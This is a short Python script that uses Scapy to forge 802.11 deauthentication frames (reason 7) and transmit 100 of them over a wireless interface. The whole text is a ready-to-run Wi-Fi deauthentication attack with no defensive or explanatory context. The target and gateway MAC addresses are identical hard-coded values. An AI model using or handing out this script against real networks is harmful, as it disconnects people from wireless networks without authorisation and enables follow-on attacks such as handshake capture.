from scapy.all import *

target_mac = "30:24:32:a8:ec:a1"
gateway_mac = "30:24:32:a8:ec:a1"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = 0
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
sendp(packet, inter=0.1, count=100, iface="wlan", verbose=1)